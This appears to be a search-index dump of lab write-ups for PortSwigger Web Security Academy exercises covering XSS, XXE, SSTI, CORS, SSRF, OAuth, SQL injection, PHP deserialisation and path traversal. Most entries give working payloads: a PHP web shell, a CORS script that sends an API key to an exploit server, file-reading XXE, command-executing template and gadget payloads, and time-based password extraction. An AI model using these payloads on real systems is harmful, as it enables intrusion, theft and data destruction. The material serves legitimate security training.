    "c": "Portswigger Academy Cross-site scripting Labs Introduction  What?  XSS is so prevalent that, year after year, it shows up in OWASP’s list of the top 10 vulnerabilities threatening web applications. Why?  An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s browser. If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by other users. The victim’s browser will then execute the malicious script, which might steal cookies, leak personal information, change site contents, or redirect the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute. How?  Cross-site scripting (XSS) techniques Open redirection techniques Reflected XSS into HTML context with nothing encoded Stored XSS into HTML context with nothing encoded DOM XSS in document.write sink using source location.search DOM XSS in innerHTML sink using source location.search DOM XSS in jQuery anchor href attribute sink using location.search source DOM XSS in jQuery selector sink using a hashchange event Reflected XSS into attribute with angle brackets HTML-encoded Stored XSS into anchor href attribute with double quotes HTML-encoded Reflected XSS into a JavaScript string with angle brackets HTML encoded DOM XSS in document.write sink using source location.search inside a select element DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded Reflected DOM XSS Stored DOM XSS Exploiting cross-site scripting to steal cookies Exploiting cross-site scripting to capture passwords Exploiting XSS to perform CSRF Reflected XSS into HTML context with most tags and attributes blocked Reflected XSS into HTML context with all tags blocked except custom ones Reflected XSS with some SVG markup allowed Reflected XSS in canonical link tag Reflected XSS into a JavaScript string with single quote and backslash escaped Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped Reflected XSS with event handlers and href attributes blocked Reflected XSS in a JavaScript URL with some characters blocked Reflected XSS with AngularJS sandbox escape without strings Reflected XSS with AngularJS sandbox escape and CSP Reflected XSS protected by very strict CSP, with dangling markup attack Reflected XSS protected by CSP, with CSP bypass",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b31368fc840329a0859c0d677fdafa43",
    "u": "https://webapp.tymyrddin.dev/docs/upload/3",
    "t": "Web shell upload via path traversal ",
    "c": "Web shell upload via path traversal  Description  This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. Reproduction and proof of concept  Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy -> HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Upload this script as your avatar. Notice that the website doesn’t seem to prevent you from uploading PHP files. In Burp Repeater, go to the tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text. In Burp’s proxy history, find the POST /my-account/avatar request that was used to submit the file upload and send it to Burp Repeater. In Burp Repeater, go to the tab containing the POST /my-account/avatar request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence: Content-Disposition: form-data; name=\"avatar\"; filename=\"../exploit.php\" Send the request. Notice that the response says The file avatars/exploit.php has been uploaded . This suggests that the server is stripping the directory traversal sequence from the file name. Obfuscate the directory traversal sequence by URL encoding the forward slash ( / ) character, resulting in: filename=\"..%2fexploit.php\" Send the request. The message now says The file avatars/../exploit.php has been uploaded . This indicates that the file name is being URL decoded by the server. In the browser, go back to the account page. In Burp’s proxy history, find the GET /files/avatars/..%2fexploit.php request. This gives a 404 response. But you can request this file using GET /files/exploit.php . Submit the secret to solve the lab. Exploitability  An attacker will need to log in; upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c010b88963c1debd2ace6b5f71a8c628",
    "u": "https://webapp.tymyrddin.dev/docs/business/8",
    "t": "Insufficient workflow validation ",
    "c": "Insufficient workflow validation  Description  This lab makes flawed assumptions about the sequence of events in the purchasing workflow. Reproduction  With Burp running, log in with wiener:peter and buy any item that you can afford with your store credit. Study the proxy history. Observe that when you place an order, the POST /cart/checkout request redirects you to an order confirmation page. Send GET /cart/order-confirmation?order-confirmation=true to Burp Repeater. Add the leather jacket to your basket. In Burp Repeater, resend the order confirmation request. Observe that the order is completed without the cost being deducted from your store credit and the lab is solved. PoC  Exploitability  An attacker will need to log in, fiddle around in the order flow and buy a “Lightweight l33t leather jacket” for free.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "63c4e5fc58c434aadcecc7a1ff1325d6",
    "u": "https://webapp.tymyrddin.dev/docs/cors/2",
    "t": "CORS vulnerability with trusted null origin ",
    "c": "CORS vulnerability with trusted null origin  Description  This website has an insecure CORS configuration in that it trusts the null origin. Reproduction and proof of concept  Start Burp, foxyproxy, and with intercept off, log in to wiener:peter on the target site and access the account page. In Burp, review the HTTPhistory . The API key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS. Analysis: Browsers will never send cookies if wildcard origins are used, regardless of the content of the Access-Control-Allow-Credentials header. The inclusion of the session cookies in the request, so wildcard origins can not be abused here. Null origin allows access to the response if the Access-Control-Allow-Credentials header is set to true. Send the request to Burp Repeater , and resubmit it with the added header Origin: null . Check that the null origin is reflected in the Access-Control-Allow-Origin header of the response. Took a break. Timed out. lab-id change. Create exploit (replacing lab-id and exploit-server-id ). The iframe sandbox generates a null origin request . <html> <body> <iframe style=\"display:none\" sandbox=\"allow-scripts\" srcdoc=\"<script> var req = new XMLHttpRequest(); var url = 'https://lab-id.web-security-academy.net/' req.onreadystatechange = function () { if (req.readyState == XMLHttpRequest.DONE) { fetch('https://exploit-server-id/log/key=' + req.responseText) } }; req.open('get', url + 'accountDetails',true); req.withCredentials = true; req.send(null); </script>\"></iframe> </body> </html> Go to the exploit server and enter the exploit in the body field of the form. Click View exploit and check you land on the log page and check the API key of the current account is in the URL. Deliver exploit to victim . Go to Access log Copy the administrator’s API key, and enter it as solution to the lab. Exploitability  An attacker needs to craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to the exploit server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "511fbe96a7591b54a6f62fc6470c8c4c",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/6",
    "t": "Exploiting blind XXE to retrieve data via error messages ",
    "c": "Exploiting blind XXE to retrieve data via error messages  Description  This lab has a “Check stock” feature that parses XML input but does not display the result. Reproduction and proof of concept  Click Go to exploit server and save the following malicious DTD file on thr server: <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>\"> %eval; %exfil; When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path. Click “View exploit” and take a note of the URL for your malicious DTD. Exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. Visit a product page, click Check stock , and intercept the resulting POST request in Burp Suite. Send it to Repeater, and insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"> %xxe;]> You should see an error message containing the contents of the /etc/passwd file. Exploitability  An attacker needs to use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cf8de32033bf034c6abb40686bf82de2",
    "u": "https://webapp.tymyrddin.dev/docs/xss/6",
    "t": "DOM XSS in jQuery selector sink using a hashchange event ",
    "c": "DOM XSS in jQuery selector sink using a hashchange event  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. Reproduction and proof of concept  Notice the vulnerable code on the home page using Burp or the browser’s DevTools. <script> $(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); }); </script> A Jquery hashchange event tracks URL history changes. When a change happens, decodeURIComponent is called on the window.location.hash . If that part of the page exists, the browser scrolls to it. Create exploit: <iframe src=\"https://lab-id.web-security-academy.net/#\" onload=\"this.src+='<img src=1 onerror=print(1)>'\"> From the lab banner, open the exploit server. For delivery, up top click on Go To Exploit Server, enter the exploit in the body field and Store the changes. Then click View Exploit to try it out on yourself. If that worked, click Deliver Exploit to Victim .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d7f43f76a72115e5e420a01e466d47cd",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/8",
    "t": "Exploiting XXE via image file upload ",
    "c": "Exploiting XXE via image file upload  Description  This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. Reproduction and proof of concept  Create a local SVG image with the following content: <?xml version=\"1.0\" standalone=\"yes\"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]> <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"> <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text> </svg> Post a comment on a blog post, and upload this image as an avatar. View the image via the source code of the Blog page with the comment(s). When you view the comment, you should see the contents of the /etc/hostname file in the image. Use the “Submit solution” button to submit the value of the server hostname. Exploitability  An attacker needs to upload an image that displays the contents of the /etc/hostname file after processing, and then use the “Submit solution” button to submit the value of the server hostname.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "19c9ee1dfd5dbb47a0953afba5a901bf",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/1",
    "t": "Basic server-side template injection ",
    "c": "Basic server-side template injection  Description  This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. Reproduction and proof of concept  Notice that when you try to view more details about the first product, a GET request uses the message parameter to render “ Unfortunately this product is out of stock ” on the home page. GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1 Host: 0a92004e03b924bac214204200eb00bf.web-security-academy.net ... In the ERB documentation , discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page. Use ERB template syntax to create a test payload containing a mathematical operation, for example: <%= 7*7 %> URL-encode this payload and insert it as the value of the message parameter in the URL: https://0a92004e03b924bac214204200eb00bf.web-security-academy.net/?message=<%25%3d+7*7+%25> Load the URL in your browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability. From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands. Construct a payload to delete Carlos’s file: <%= system(\"rm /home/carlos/morale.txt\") %> URL-encode the payload and insert it as the value of the message parameter: https://0a92004e03b924bac214204200eb00bf.web-security-academy.net/?message=<%25+system(\"rm+/home/carlos/morale.txt\")+%25> Exploitability  An attacker will need to review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2fb487b184d0188e522aedfdb5fd5460",
    "u": "https://webapp.tymyrddin.dev/docs/xss/30",
    "t": "Reflected XSS protected by CSP, with CSP bypass ",
    "c": "Reflected XSS protected by CSP, with CSP bypass  Description  The website in this lab uses CSP and contains a reflected XSS vulnerability. Reproduction and proof of concept  Enter the following into the search box: <img src=1 onerror=alert(1)> Note the payload is reflected, but the CSP prevents the script from executing. In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy. Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token= Visit the following URL, replacing 0a87000e04aa4aacc0a72cd800b1007d with your lab ID: https://0a87000e04aa4aacc0a72cd800b1007d.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27 The injection uses the script-src-elem directive in CSP. This directive allows for targeting just script elements. Using this directive, it is possible to overwrite existing script-src rules enabling unsafe-inline injections, which allows for using inline scripts.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cd3e872dab1d038d41388fd3e65d9f59",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/java-ssti",
    "t": "Java: Server-side Template Injection (SSTI) ",
    "c": "Java: Server-side Template Injection (SSTI)  root-me challenge: Java - Server-side Template Injection : Exploit the vulnerability in order to retrieve the validation password in the file SECRET_FLAG.txt . PayLoadAllTheThings Freemarker code execution ${\"freemarker.template.utility.Execute\"?new()(\"ls -la\")} etcetera. Resources  Server-Side Template Injection RCE For The Modern Web App - BlackHat 15",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c94799704252ebf82e496e2659094b8e",
    "u": "https://webapp.tymyrddin.dev/docs/xss/7",
    "t": "Reflected XSS into attribute with angle brackets HTML-encoded ",
    "c": "Reflected XSS into attribute with angle brackets HTML-encoded  Description  The website in this lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. Also see the leads from HackTricks concerning XSS methodology and XSS Inside HTML tags attribute : 2. If you can escape from the attribute but not from the tag (-> is encoded or deleted), depending on the tag you could create an event that executes JS code: Reproduction and proof of concept  Put a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. The random string has been reflected inside a quoted attribute. Replace the input with a payload to escape the quoted attribute and inject an event handler: \" autofocus onfocus=alert(1) x=\" Verify the technique worked by right-clicking, selecting “Copy URL”, and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert. The resulting HTML: <section class=blog-header> <h1>0 search results for '&quot; autofocus onfocus=alert(1) x=&quot;'</h1> <hr> </section>",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "817d6a2ae13314169ff66ddb9007f99e",
    "u": "https://webapp.tymyrddin.dev/docs/headers/5",
    "t": "SSRF via flawed request parsing ",
    "c": "SSRF via flawed request parsing  Description  This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request’s intended host. This can be exploited to access an insecure intranet admin panel located at an internal IP address. Reproduction  Send the GET / request that received a 200 response to Burp Repeater and study the lab’s behaviour. Observe that the website validates the Host header and blocks any requests in which it has been modified. Observe that you can also access the home page by supplying an absolute URL in the request line as follows: GET https://lab-id.web-security-academy.net/ Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header. Use Burp Collaborator client to confirm that you can make the website’s middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server: GET https://lab-id.web-security-academy.net/ Host: BURP-COLLABORATOR-SUBDOMAIN Right-click and select “Insert Collaborator payload” to insert a Burp Collaborator subdomain where indicated in the request. Send the request containing the absolute URL to Burp Intruder. Use the Host header to scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface. Send this request to Burp Repeater. In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users. Change the absolute URL in your request to point to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET https://lab-id.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos Send the request to delete Carlos and solve the lab. PoC  Exploitability  An attacker will need to access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "023b853b70a18a69ddfe57573609c6ce",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/9",
    "t": "Developing a custom gadget chain for PHP deserialisation ",
    "c": "Developing a custom gadget chain for PHP deserialisation  Description  This lab uses a serialisation-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialisation to achieve remote code execution. Reproduction and proof of concept  Log in with wiener:peter . The session cookie contains a serialised PHP object. The website references the file /cgi-bin/libs/CustomTemplate.php (find in Target tab). Get the source code by submitting a request using the .php~ backup file extension. Response: HTTP/1.1 200 OK Content-Type: text/plain Set-Cookie: session=; Secure; HttpOnly; SameSite=None X-Frame-Options: SAMEORIGIN Connection: close Content-Length: 1396 <?php class CustomTemplate { private $default_desc_type; private $desc; public $product; public function __construct($desc_type='HTML_DESC') { $this->desc = new Description(); $this->default_desc_type = $desc_type; // Carlos thought this is cool, having a function called in two places... What a genius $this->build_product(); } public function __sleep() { return [\"default_desc_type\", \"desc\"]; } public function __wakeup() { $this->build_product(); } private function build_product() { $this->product = new Product($this->default_desc_type, $this->desc); } } class Product { public $desc; public function __construct($default_desc_type, $desc) { $this->desc = $desc->$default_desc_type; } } class Description { public $HTML_DESC; public $TEXT_DESC; public function __construct() { // @Carlos, what were you thinking with these descriptions? Please refactor! $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>'; $this->TEXT_DESC = 'This product is cool in text'; } } class DefaultMap { private $callback; public function __construct($callback) { $this->callback = $callback; } public function __get($name) { return call_user_func($this->callback, $name); } } ?> The __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate . The DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn’t exist for this object. This magic method invokes call_user_func() , which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name , which is the non-existent attribute that was requested. This gadget chain can be exploited to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where: CustomTemplate->default_desc_type = \"rm /home/carlos/morale.txt\"; CustomTemplate->desc = DefaultMap; DefaultMap->callback = \"exec\" Follow the data flow in the source code: this will cause the Product constructor to try and fetch the default_desc_type from the DefaultMap object. As it doesn’t have this attribute, the __get() method will invoke the callback exec() method on the default_desc_type , which is set to the shell command. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via the session cookie: O:14:\"CustomTemplate\":2:{s:17:\"default_desc_type\";s:26:\"rm /home/carlos/morale.txt\";s:4:\"desc\";O:10:\"DefaultMap\":1:{s:8:\"callback\";s:4:\"exec\";}} Exploitability  An attacker will need to log in to wiener:peter ; and delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "870c5d6bf5340d347dbd77fdaa1420c3",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/3",
    "t": "OAuth account hijacking via redirect_uri ",
    "c": "OAuth account hijacking via redirect_uri  Description  This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorisation codes associated with other users’ accounts. Reproduction and proof of concept  While proxying traffic through Burp, click My account and complete the OAuth login process. Afterwards, you will be redirected back to the blog website. https://oauth-0ac600970457d960c02ae86d027200a9.oauth-server.net/auth/p9Zl4tDpANUmA7daaGrir Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn’t need to enter your credentials again to authenticate yourself. In Burp, study the OAuth flow in the proxy history and identify the most recent authorisation request. This should start with GET /auth?client_id=[...] . Notice that when this request is sent, you are immediately redirected to the redirect_uri along with the authorisation code in the query string. Send this authorisation request to Burp Repeater. In Burp Repeater, observe that you can submit any arbitrary value as the redirect_uri without encountering an error. Notice that your input is used to generate the redirect in the response. Change the redirect_uri to point to the exploit server, then send the request and follow the redirect. Go to the exploit server’s access log : There is a log entry containing an authorisation code. This confirms it is possible to leak authorisation codes to an external domain. Go back to the exploit server and create the following iframe at /exploit : <iframe src=\"https://oauth-0ac600970457d960c02ae86d027200a9.oauth-server.net/auth?client_id=g92riblrj8611fgr7szqz&redirect_uri=https://exploit-0a68007904cad9f0c073e9a201f00023.exploit-server.net&response_type=code&scope=openid%20profile%20email\"></iframe> Store the exploit and click View exploit . Check that your iframe loads and then check the exploit server’s access log : Deliver the exploit to the victim, then go back to the access log : Copy the victim’s code from the resulting request. 5q8G6tiMiyS3DRtK3lnJt1Jkb08l642WL_aJGbSlCxp Log out of the blog website and then use the stolen code to navigate to: https://0aca00c7046dd970c046ea7c0009002f.web-security-academy.net/oauth-callback?code=5q8G6tiMiyS3DRtK3lnJt1Jkb08l642WL_aJGbSlCxp The rest of the OAuth flow will be completed automatically, and you will be logged in as the admin user. Open the admin panel and delete Carlos. Exploitability  An attacker will need to log in to wiener:peter ; and then steal an authorisation code associated with the admin user; then use it to access their account and delete Carlos. The admin user will open anything sent from the exploit server, and always has an active session with the OAuth service.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "51c5231b90826230727658a9d16aeca0",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy JWT Labs Introduction  What?  JSON web tokens (JWTs) are a standardised format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. JWTs are a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers. Why?  Design issues and flawed handling of JSON web tokens (JWTs) can leave websites vulnerable to a variety of high-severity attacks. As JWTs are most commonly used in authentication, session management, and access control mechanisms, these vulnerabilities can potentially compromise the entire website and its users. How?  JSON web tokens attacks JWT authentication bypass via unverified signature JWT authentication bypass via flawed signature verification JWT authentication bypass via weak signing key JWT authentication bypass via jwk header injection JWT authentication bypass via jku header injection JWT authentication bypass via kid header path traversal JWT authentication bypass via algorithm confusion JWT authentication bypass via algorithm confusion with no exposed key",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a86aae1fba0f272e5cc379f60ae61886",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/3",
    "t": "File path traversal, traversal sequences stripped non-recursively ",
    "c": "File path traversal, traversal sequences stripped non-recursively  Description  This lab contains a file path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Modify the filename parameter, giving it the value: ....//....//....//etc/passwd The response contains the contents of the /etc/passwd file: Exploitability  An attacker will need to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "40090a8d9d1b322512dcc4a4c2800c5b",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/14",
    "t": "Blind SQL injection with time delays and information retrieval ",
    "c": "Blind SQL injection with time delays and information retrieval  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. The database contains a different table called users, with columns called username and password. Exploiting the blind SQL injection vulnerability gives the password of the administrator user. Reproduction and proof of concept  Visit the Home page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Modify the TrackingId cookie, changing it to: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- Verify that the application takes 10 seconds to respond. Now change it to: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- The application responds immediately with no time delay, demonstrating how to test a single boolean condition and infer the result. Change it to: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- The condition is true, confirming that there is a user called administrator . The next step is to determine how many characters are in the password of the administrator user: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- This condition is true, confirming that the password is greater than 1 character in length. Send a series of follow-up values to test different password lengths. Send: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- Then send: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- And so on. Do this manually using Burp Repeater, because the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), the length of the password is known. It is 20 characters long. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests. Send the request to Burp Intruder, using the context menu. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the “Clear §” button. In the Positions tab, change the value of the cookie to: TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. The attack has to cycle through each position and possible value, testing each one in turn. Place payload position markers around the a character in the cookie value. Select the a , and click the “Add §” button (note the payload position markers): TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- To test the character at each position, send suitable payloads in the payload position defined. In this lab, assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that “Simple list” is selected, and under “Payload Options” add the payloads in the range a-z and 0-9 . Select these using the “Add from list” drop-down. To be able to tell when the correct character was submitted, monitor the time taken for the application to respond to each request: Configure the Intruder attack to issue requests in a single thread: Go to the “Resource pool” tab and add the attack to a resource pool with the “Maximum concurrent requests” set to 1. Launch the attack by clicking the “Start attack” button or selecting “Start attack” from the Intruder menu. Burp Intruder monitors the time taken for the application’s response to be received, but by default it does not show this information. To see it, go to the “Columns” menu, and check “Response received”. Review the attack results to find the value of the character at the first position. There should now be a column in the results called “Response received”. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows will have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position. Re-run the attack for each of the other character positions in the password, to determine their value: Go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2 : TrackingId=Q2FXgn5mU12ePxfM'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- Launch the modified attack, review the results, and note the character at the second offset. Continue this process testing offset 3 , 4 , and so on, until the whole password is known. In the browser, click “My account” to open the login page. Use the password to log in as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e4a11aec0f4ec08c7fe2be7afcb01542",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/traversal",
    "t": "Directory traversal ",
    "c": "Directory traversal  Directory traversal (also called Path traversal) is an exploit which lets attackers access restricted directories, execute commands and view data outside the normal Web server directory where the application content is stored. By manipulating files with “dot-dot-slash ( ../ )” sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on the filesystem; including application source code, configuration, and other critical system files. Steps  Enumerate input vectors. Analyse input validation functions. Enumeration  List all application components that can accept user input, such as HTTP , POST and GET calls, HTML forms, and file uploads. Check for: Request parameters which can potentially be used for file-related operations, such as getUserProfile.jsp?item=abcd.html . Unusual file extensions, like index.jsp?file=content . Interesting variable names, for example main.php?home=index.htm . Analysis  Try inserting relative paths into files existing on the web server, for example: ../../../../../../etc/hosts ../../../../../../etc/passwd Bypass protections  Many applications that place user input have some kind of protection against path traversal attacks: Applications can strip or block directory traversal sequences from the user-supplied filename => try an absolute path, nested traversal, and url encoding (in a multipart/form-data request ). Some applications validate start of path => include the required base folder followed by suitable traversal sequences. It can be that the filename value must end with an expected file extension => try a null byte like %00 before inserting a valid extension. Absolute paths  Absolute path from the filesystem root to directly reference a file without using any traversal sequences: filename=/etc/hosts filename=/etc/passwd Nested traversal  Nested traversal sequences which will revert to simple traversal sequences when the inner sequence is stripped: ....// ....\\/ URL encoding  Check whether a system is vulnerable to certain tricks like a ../ removal that uses percent-encoded values: url encoding: %2e%2e%2f double url encoding: %252e%252e%252f Null byte bypass  filename=../../../etc/passwd%00.png Escalation  With a directory traversal, it may be possible to read arbitrary files on the server that is running the application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, it may be possible to write to arbitrary files on the server, modifying application data or behaviour, and ultimately taking full control of the server. Portswigger lab writeups  File path traversal, simple case File path traversal, traversal sequences blocked with absolute path bypass File path traversal, traversal sequences stripped non-recursively File path traversal, traversal sequences stripped with superfluous URL-decode File path traversal, validation of start of path File path traversal, validation of file extension with null byte bypass Remediation  Avoid relying on user-supplied input when dealing with filesystem APIs. Oh well, back to the drawing board, because this might require rewriting a major part of the application. Prevent the user-supplied directory from being higher up on the filesystem than the directory used to serve static content. Sanitise user-supplied data and get rid of unexpected inputs, for example by maintaining a set of allowed filesystem paths and comparing user input against that set or by allowing only alphanumeric characters and rejecting inputs that contain other characters. If that is not possible, consider disallowing dangerous characters explicitly. Sanitisation of user input is a never-ending story and requires constant verification against newly discovered ways to bypass known protection methods. It may be better to use a well-maintained open-source library for it. Check these open source libraries with vulnerability scanners to find the best candidates. Another option is to build the application with web frameworks, which have built-in support for serving static content. Use secure coding practices at every stage of the development and operations pipeline: Static application security testing (SAST) reviews the source code of the application when it is not running. SAST checks try to identify evidence of known insecure practices and vulnerabilities. SAST solutions employ white-box techniques. Dynamic application security testing (DAST) communicates with the application through its front-end in order to identify security vulnerabilities. A DAST tool does not need any access to source code. It simulates real attacks using a black-box strategy. Security checks are done while executing or running the application or code under review. It can also involve fuzzing to uncover 